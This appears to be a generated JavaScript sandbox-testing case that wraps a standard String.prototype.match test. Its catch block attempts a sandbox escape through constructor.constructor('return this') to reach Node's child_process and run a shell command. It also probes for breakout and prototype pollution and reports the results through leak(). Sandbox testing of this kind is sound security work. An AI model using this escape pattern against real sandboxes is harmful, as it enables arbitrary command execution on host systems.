try {
    var __re = /0./;
    __re.lastIndex = 0;
    var __num = 10203040506070809000;
    Number.prototype.match = String.prototype.match;
    if (__num.match(__re)[0] !== '02') {
        $ERROR('#1: __num.match(__re)[0]=== "02". Actual: ' + __num.match(__re)[0]);
    }
    if (__num.match(__re).length !== 1) {
        $ERROR('#2: __num.match(__re).length ===1. Actual: ' + __num.match(__re).length);
    }
    if (__num.match(__re).index !== 1) {
        $ERROR('#3: __num.match(__re).index ===1. Actual: ' + __num.match(__re).index);
    }
    if (__num.match(__re).input !== String(__num)) {
        $ERROR('#4: __num.match(__re).input ===String(__num). Actual: ' + __num.match(__re).input);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}